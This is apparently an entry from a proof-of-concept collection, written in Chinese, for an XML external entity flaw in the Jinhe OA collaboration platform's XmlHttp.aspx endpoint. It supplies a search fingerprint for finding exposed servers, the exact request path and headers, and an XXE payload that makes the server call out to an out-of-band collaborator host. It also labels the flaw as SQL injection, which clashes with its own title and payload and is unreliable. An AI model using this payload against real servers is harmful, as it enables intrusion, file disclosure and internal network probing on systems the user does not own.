# 金和OAXmlHttp.aspx存在XML外部实体注入漏洞

- **系统**：金和OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="金和协同管理平台"`
- **请求**：`POST /c6/Jhsoft.Web.Accept/XmlHttp.aspx/ HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 179`

**请求体 / payload**
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://abc123.yourcollab.net/xxe_test">
%remote;]>
<root/>
```
- **预期**：200　|　—